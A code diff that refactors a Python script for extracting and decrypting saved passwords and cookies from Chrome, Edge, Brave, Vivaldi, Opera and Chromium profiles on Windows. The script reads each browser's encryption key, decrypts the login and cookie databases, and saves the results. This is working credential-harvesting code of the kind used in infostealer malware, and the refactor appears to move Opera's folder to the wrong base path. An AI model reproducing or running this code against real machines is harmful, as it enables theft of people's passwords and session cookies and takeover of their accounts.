@@ -7,6 +7,16 @@ import json
 import base64
 from shutil import copyfile
 
+LOCAL = os.environ['LOCALAPPDATA']
+BROWSERS = {
+    "chrome": f"{LOCAL}/Google/Chrome/User Data/",
+    "edge": f"{LOCAL}/Microsoft/Edge/User Data/",
+    "chromium": f"{LOCAL}/Chromium/User Data/",
+    "brave": f"{LOCAL}/BraveSoftware/Brave-Browser/User Data/",
+    "vivaldi": f"{LOCAL}/Vivaldi/User Data/",
+    "opera": f"{LOCAL}/Opera Software/Opera Stable"
+}
+
 
 def win_decrypt(encrypted_key):
     decrypted_value = win32crypt.CryptUnprotectData(
@@ -21,95 +31,40 @@ def chrome_80_decrypt(encrypted, chrome_key):
     return decrypted[:-16].decode()
 
 
-def chromnium_exists():
-    LOCAL = os.environ['LOCALAPPDATA']
-    return os.path.exists(f"{LOCAL}/Chromium/User Data")
+def confirm_exist(directory):
+    return os.path.exists(directory)
 
 
-def edge_exists():
-    LOCAL = os.environ['LOCALAPPDATA']
-    return os.path.exists(f"{LOCAL}/Microsoft/Edge/User Data")
+def get_cookie_directory(base_dir):
+    cookie_folders = (
+        f"{base_dir}/Default/Cookies",
+        f"{base_dir}/Cookies"
+    )
+    for cookie_folder in cookie_folders:
+        if os.path.exists(cookie_folder):
+            return cookie_folder
+    return False
 
 
-def chrome_exists():
-    LOCAL = os.environ['LOCALAPPDATA']
-    return os.path.exists(f"{LOCAL}/Google/Chrome/User Data")
+def get_login_directory(base_dir):
+    login_folders = (
+        f"{base_dir}/Default/Login Data",
+        f"{base_dir}/Login Data"
+    )
+    for login_folder in login_folders:
+        if os.path.exists(login_folder):
+            return login_folder
+    return False
 
 
-def brave_exists():
-    LOCAL = os.environ['LOCALAPPDATA']
-    return os.path.exists(f"{LOCAL}/BraveSoftware/Brave-Browser/User Data/")
+def get_directories(base_dir):
+    key_directory = f"{base_dir}/Local State"
+    cookie_directory = get_cookie_directory(base_dir)
+    login_directory = get_login_directory(base_dir)
 
-
-def vivaldi_exists():
-    LOCAL = os.environ['LOCALAPPDATA']
-    return os.path.exists(f"{LOCAL}/Vivaldi/User Data/")
-
-
-def opera_exists():
-    LOCAL = os.environ['APPDATA']
-    a = os.path.exists(f"{LOCAL}/Opera Software/Opera Stable")
-    return os.path.exists(f"{LOCAL}/Opera Software/Opera Stable")
-
-
-def get_opera_directories():
-    LOCAL = os.environ['APPDATA']
-    opera_dir = f"{LOCAL}/Opera Software/Opera Stable"
-    key_directory = f"{opera_dir}/Local State"
-    cookie_directory = f"{opera_dir}/Cookies"
-    login_directory = f"{opera_dir}/Login Data"
-
-    return key_directory, cookie_directory, login_directory
-
-
-def get_vivaldi_directories():
-    LOCAL = os.environ['LOCALAPPDATA']
-    vivaldi_dir = f"{LOCAL}/Vivaldi/User Data/"
-    key_directory = f"{vivaldi_dir}/Local State"
-    cookie_directory = f"{vivaldi_dir}/Default/Cookies"
-    login_directory = f"{vivaldi_dir}/Default/Login Data"
-
-    return key_directory, cookie_directory, login_directory
-
-
-def get_chrome_directories():
-    LOCAL = os.environ['LOCALAPPDATA']
-    chrome_dir = f"{LOCAL}/Google/Chrome/User Data/"
-    key_directory = f"{chrome_dir}/Local State"
-    cookie_directory = f"{chrome_dir}/Default/Cookies"
-    login_directory = f"{chrome_dir}/Default/Login Data"
-
-    return key_directory, cookie_directory, login_directory
-
-
-def get_brave_directories():
-    LOCAL = os.environ['LOCALAPPDATA']
-    brave_dir = f"{LOCAL}/BraveSoftware/Brave-Browser/User Data/"
-    key_directory = f"{brave_dir}/Local State"
-    cookie_directory = f"{brave_dir}/Default/Cookies"
-    login_directory = f"{brave_dir}/Default/Login Data"
-
-    return key_directory, cookie_directory, login_directory
-
-
-def get_edge_directories():
-    LOCAL = os.environ['LOCALAPPDATA']
-    edge_dir = f"{LOCAL}/Microsoft/Edge/User Data/"
-    key_directory = f"{edge_dir}/Local State"
-    cookie_directory = f"{edge_dir}/Default/Cookies"
-    login_directory = f"{edge_dir}/Default/Login Data"
-
-    return key_directory, cookie_directory, login_directory
-
-
-def get_chromium_directories():
-    LOCAL = os.environ['LOCALAPPDATA']
-    chromium_dir = f"{LOCAL}/Chromium/User Data/"
-    key_directory = f"{chromium_dir}/Local State"
-    cookie_directory = f"{chromium_dir}/Default/Cookies"
-    login_directory = f"{chromium_dir}/Default/Login Data"
-
-    return key_directory, cookie_directory, login_directory
+    if cookie_directory and login_directory:
+        return (key_directory, cookie_directory, login_directory)
+    return None
 
 
 def get_encryption_key(key_directory):
@@ -160,9 +115,10 @@ def get_logins(directory, key):
             decrypted = chrome_80_decrypt(encrypted, key)
         else:
             decrypted = win_decrypt(encrypted)
-        login_obj = {}
-        login_obj["name"] = username
-        login_obj["value"] = decrypted
+        login_obj = {
+            "name": username,
+            "value": decrypted,
+        }
         logins[url].append(login_obj)
     conn.close()
     return logins
@@ -186,8 +142,9 @@ def save_data(logins=False, cookies=False):
 
 
 if __name__ == "__main__":
-    key_directory, cookie_directory, login_directory = get_chrome_directories()
-    chrome_key = get_chrome_key(key_directory)
+    key_directory, cookie_directory, login_directory = get_directories(
+        BROWSERS["chrome"])
+    chrome_key = get_encryption_key(key_directory)
     cookies = get_cookies(cookie_directory, chrome_key)
     logins = get_logins(login_directory, chrome_key)
     save_data(logins=logins, cookies=cookies)
